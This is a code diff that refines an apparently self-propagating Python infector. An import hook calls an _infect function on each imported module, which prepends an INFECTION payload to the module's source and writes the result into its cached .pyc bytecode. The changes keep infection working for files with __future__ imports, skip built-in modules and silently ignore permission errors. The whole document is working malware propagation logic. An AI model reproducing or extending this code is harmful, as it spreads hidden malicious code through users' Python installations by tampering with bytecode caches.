@@ -25,8 +25,18 @@ def _infect(filename):
     cfile = importlib.util.cache_from_source(filename)
     loader = importlib.machinery.SourceFileLoader('<py_compile>', filename)
     source_bytes = loader.get_data(filename)
-    source_bytes = INFECTION.format(__file__).encode("ascii") + source_bytes
-    code = loader.source_to_code(source_bytes, filename)
+    infected_bytes = b''
+    injected = False
+    has_future = b'from __future__' in source_bytes
+    for line in source_bytes.split(b'\n'):
+        if not injected and not has_future:
+            infected_bytes += INFECTION.format(__file__).encode("ascii")
+            injected = True
+        infected_bytes += line + b'\n'
+        if b'from __future' in line:
+            has_future = False
+
+    code = loader.source_to_code(infected_bytes, filename)
     try:
         dirname = os.path.dirname(cfile)
         if dirname:
@@ -37,7 +47,10 @@ def _infect(filename):
     bytecode = importlib._bootstrap_external._code_to_bytecode(
             code, source_stats['mtime'], source_stats['size'])
     mode = importlib._bootstrap_external._calc_mode(filename)
-    importlib._bootstrap_external._write_atomic(cfile, bytecode, mode)
+    try:
+        importlib._bootstrap_external._write_atomic(cfile, bytecode, mode)
+    except PermissionError:
+        pass
 
 
 class InfectImporter():
@@ -50,7 +63,8 @@ class InfectImporter():
         if not self.inside:
             self.inside = True
             spec = importlib.util.find_spec(name, path)
-            infect(spec.origin)
+            if spec.origin and spec.origin != 'built-in':
+                infect(spec.origin)
             self.inside = False
         return None
 
